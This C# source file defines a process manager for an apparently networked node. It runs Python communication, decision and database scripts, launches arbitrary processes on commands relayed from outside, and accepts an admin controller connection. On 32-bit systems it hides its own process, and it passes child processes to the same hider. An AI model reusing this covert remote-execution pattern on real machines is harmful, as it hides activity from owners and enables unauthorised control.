#define CHECK_OS

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Threading;

namespace Manager
{
    class ProcessManager
    {
        #region constants
        private const int COMMUNICATION_PROCESS_IND = 0;
        private const int DECISIONS_PROCESS_IND = 1;
        private const int DATABASE_PROCESS_IND = 2;
        private const int MAIN_PROCESSES_NUM = 3;
        private const char SEND_CMD = 's';
        private const char START_PROCESS_CMD = 'p';
        private const char QUERY_CMD = 'q';
        private const char PROCESS_ENDED_CODE = 'e';
        public const char PROCESS_DATA_CODE = 'd';
        private const char QUERY_RESPONSE_CODE = 'Q';
        private const char DISPLAY_CODE = 'D'; // display to admin <=> only if the admin is connected
        private readonly string databaseFile;//@"db\db.db";
        #endregion

        #region fields
        private ProcessHider procHider;
        private ProcessHandler[] mainProcesses;
        private ProcessHandler controllerProcess;
        private List<ProcessHandler> secondaryProcesses;
        private Queue<string> Queries;
        private bool shutdown;
        private bool isAdminConnected;
        private int mainThreadId;
        #endregion

        public ProcessManager()
        {
            procHider = new ProcessHider();
            mainProcesses = new ProcessHandler[MAIN_PROCESSES_NUM];
            secondaryProcesses = new List<ProcessHandler>();
            Queries = new Queue<string>();
            shutdown = false;
            isAdminConnected = false;
            mainThreadId = Thread.CurrentThread.ManagedThreadId;
            Directory.CreateDirectory("temp"); // for output files or executables i.e. python code or batch files
#if (CHECK_OS)
            if (!Environment.Is64BitOperatingSystem) // 32 bit system
#endif
                procHider.HideProc(Process.GetCurrentProcess());
            databaseFile = NetworkInterface.GetAllNetworkInterfaces().Where(nic => nic.OperationalStatus == OperationalStatus.Up)
                .Select(nic => nic.GetPhysicalAddress().ToString()).Last(); // to know the difference between different node's databases
        }

        /// <summary>
        /// call to shutdown the manager
        /// </summary>
        public void Shutdown()
        {
            this.shutdown = true;
            lock (this.mainProcesses) lock (this.secondaryProcesses)
                {
                    foreach (var procH in this.secondaryProcesses) // kill all
                        procH.Kill();
                    foreach (var procH in this.mainProcesses)
                        procH.Kill();
                    this.mainProcesses = new ProcessHandler[MAIN_PROCESSES_NUM];
                    this.secondaryProcesses = new List<ProcessHandler>();
                }
        }

        /// <summary>
        /// manager main loop
        /// </summary>
        public void Run()
        {
            for (int i = 0; i < this.mainProcesses.Length; i++)
                this.mainProcesses[i] = new ProcessHandler(this.procHider);
            // python -u = python unbuffered -> disable the need for sys.stdout.flush() after every print (like doing it automatically)
            if (!this.mainProcesses[COMMUNICATION_PROCESS_IND].StartProcess("python", @"-u Communication\communicator.py", this.OnCommunicationReceived) ||
                !this.mainProcesses[DECISIONS_PROCESS_IND].StartProcess("python" , @"-u Decider\decider.py", this.OnDecisionRecieved) ||
                !this.mainProcesses[DATABASE_PROCESS_IND].StartProcess("python", @"-u Database\database.py " + databaseFile))
                Environment.Exit(-1); // could not start main processes

            DatabaseThread(); // starts the thread if it is in the main thread

            this.Shutdown();
            Thread.Sleep(500);
        }

        private void DatabaseThread()
        {
            // the next code is made to start this thread as a seperate thread
            //if (Thread.CurrentThread.ManagedThreadId == mainThreadId) // not started as a seperate thread
            //{
            //    Thread dbThread = new Thread(DatabaseThread);
            //    dbThread.Start();
            //    return;
            //}
            while (!this.shutdown)
            {
                // lock is not needed because Count returns a variable and not counts the queries
                while (!this.shutdown && this.Queries.Count > 0) // while not empty
                {
                    bool IsBusy = false;
                    string data;
                    lock (this.Queries)
                    {
                        data = this.Queries.Dequeue();
                    }
                    lock (this.mainProcesses[DATABASE_PROCESS_IND])
                    {
                        string query = data.Substring(data.IndexOf(','));
                        string taskId = data.Substring(0, data.IndexOf(','));

                        DataReceivedEventHandler resultHandler = null;
                        resultHandler = (s, e) =>
                        {
                            if (String.IsNullOrEmpty(e.Data))
                                return;
                            lock (this.mainProcesses[DATABASE_PROCESS_IND]) lock (this.mainProcesses[DECISIONS_PROCESS_IND])
                                {
                                    this.mainProcesses[DATABASE_PROCESS_IND].RemoveOutputHandler(resultHandler); // it's working (removing the ptr and not null)
                                    this.mainProcesses[DECISIONS_PROCESS_IND].SendData(QUERY_RESPONSE_CODE + taskId + "," + e.Data);
                                }
                            IsBusy = false;
                        };

                        IsBusy = true;
                        this.mainProcesses[DATABASE_PROCESS_IND].AddOutputHandler(resultHandler);
                        this.mainProcesses[DATABASE_PROCESS_IND].SendData(query);
                        int sleepCounter = 1;
                        while (IsBusy)
                        {
                            Thread.Sleep(sleepCounter);
                            sleepCounter = sleepCounter * 2 < 10000 ? sleepCounter * 2 : 10000; // preventing it from reaching to too big numbers
                        }
                    }
                }
                Thread.Sleep(100);
            }
        }

        private void OnCommunicationReceived(object sender, DataReceivedEventArgs e)
        {
            lock (this.mainProcesses[DECISIONS_PROCESS_IND])
                this.mainProcesses[DECISIONS_PROCESS_IND].SendData(SEND_CMD + e.Data);
        }

        private void OnDecisionRecieved(object sender, DataReceivedEventArgs e)
        {
            // execute command
            if (String.IsNullOrEmpty(e.Data))
            {
                Console.WriteLine("command was empty"); // temp
                return;
            }
            string trimData = e.Data.TrimStart(); // stdin/out might add some spaces in the start
            switch (trimData[0])
            {
                case SEND_CMD:
                    lock (this.mainProcesses[COMMUNICATION_PROCESS_IND])
                        this.mainProcesses[COMMUNICATION_PROCESS_IND].SendData(trimData.Substring(1)); // pass data without command
                        // NOTICE: the data is a filename with the data
                    break;
                case START_PROCESS_CMD: // the data should be: <command type char><proccess identification string>,
                    ProcessHandler newProc = new ProcessHandler(this.procHider);
                    lock (this.secondaryProcesses)
                        this.secondaryProcesses.Add(newProc);
                    if(newProc.StartProcess(trimData.Substring(1), this.mainProcesses[DECISIONS_PROCESS_IND])) // remove command character)
                    {
                        EventHandler exitHandler = (s, e2) =>
                        {
                            lock (this.mainProcesses[DECISIONS_PROCESS_IND])
                                this.mainProcesses[DECISIONS_PROCESS_IND].SendData(ProcessManager.PROCESS_ENDED_CODE + trimData.Split(',')[0].Substring(1));
                            // equals to START_PROCESS_CMD + trimData.Split(',')[0].Substring(1)
                            lock (this.secondaryProcesses)
                                this.secondaryProcesses.Remove(newProc);
                        };
                        newProc.AddExitHandler(exitHandler);
                    }
                    else // start  process failed
                    {
                        lock (this.mainProcesses[DECISIONS_PROCESS_IND])
                            this.mainProcesses[DECISIONS_PROCESS_IND].SendData(ProcessManager.PROCESS_ENDED_CODE + trimData.Split(',')[0].Substring(1));
                        // equals to START_PROCESS_CMD + trimData.Split(',')[0].Substring(1)
                        lock (this.secondaryProcesses)
                            this.secondaryProcesses.Remove(newProc);
                    }
                    break;
                case QUERY_CMD:
                    lock(Queries)
                    {
                        Queries.Enqueue(trimData.Substring(1)); // the queued commands will be executed in another thread
                    }
                    break;
                case DISPLAY_CODE:
                    if (!this.isAdminConnected)
                    {
                        if (trimData[1] != '\'' && trimData[1] != '"') // not repr'd => try to connect from another controller
                        {
                            isAdminConnected = true;
                            this.controllerProcess = new ProcessHandler(this.procHider);
                            this.controllerProcess.StartProcess("python", @"-u ControllerConnection\controllerConnection.py " + trimData.Substring(1), OnControllerRecieved);
                            this.controllerProcess.AddExitHandler((s, e2) => { isAdminConnected = false; Console.WriteLine("admin session ended"); });
                        }
                        //else drop the message
                    }
                    else
                    {
                        if (trimData[1] != '\'' && trimData[1] != '"') // not repr'd => try to connect from another controller
                        {
                            Thread t = new Thread(() =>
                            {
                                System.Windows.Forms.MessageBox.Show("an admin is already connected\nonly one admin allowed per node!", "Error",
                                    System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error,
                                    System.Windows.Forms.MessageBoxDefaultButton.Button1, System.Windows.Forms.MessageBoxOptions.ServiceNotification);
                            });
                            t.Start();
                        }
                        else
                            lock (this.controllerProcess)
                                this.controllerProcess.SendData(trimData.Substring(1));
                    }
                    break;
                default:
                    Console.WriteLine("unknown cmd data: " + e.Data + "\n\n trimmed: " + trimData);
                    StreamWriter lsw = new StreamWriter("unknown cmd.hex");
                    lsw.Write(e.Data + "\n" + trimData);
                    lsw.Close();
                    throw new InvalidOperationException("Unknown command: " + e.Data + "\n\n trimmed: " + trimData);
            }
        }

        private void OnControllerRecieved(object sender, DataReceivedEventArgs e)
        {
            if (!String.IsNullOrEmpty(e.Data))
                lock (this.mainProcesses[COMMUNICATION_PROCESS_IND])
                    this.mainProcesses[COMMUNICATION_PROCESS_IND].SendData(e.Data); // pass data to send
        }

        private void KillSecondaryProcess(ProcessHandler p)
        {
            lock(this.secondaryProcesses)
                this.secondaryProcesses.Remove(p);
            p.Kill();
        }
    }
}

